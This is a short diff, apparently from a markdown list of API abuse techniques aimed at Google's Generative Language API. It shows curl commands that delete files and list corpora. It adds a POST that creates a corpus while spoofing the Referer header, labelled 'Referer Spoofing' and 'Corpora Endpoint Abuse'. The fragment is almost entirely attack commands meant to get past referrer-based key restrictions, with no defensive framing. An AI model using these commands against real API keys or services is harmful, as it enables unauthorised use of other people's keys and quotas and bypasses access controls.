@@ -68,3 +68,9 @@ curl -X DELETE "https://generativelanguage.googleapis.com/v1beta/files/1d1j3cg1b
 curl -s -H "Referer: https://www.google.com/" "https://generativelanguage.googleapis.com/v1beta/corpora?key=YOUR_API_KEY"
 ```
      -Referer Spoofing
+     
+```
+curl -X POST \ -H "Content-Type: application/json" \ -H "Referer: https://www.google.com/" \ "https://generativelanguage.googleapis.com/v1beta/corpora?key=YOUR_API_KEY" \ -d '{"display_name": "your_project_name"}'
+```
+     -Corpora Endpoint Abuse
+
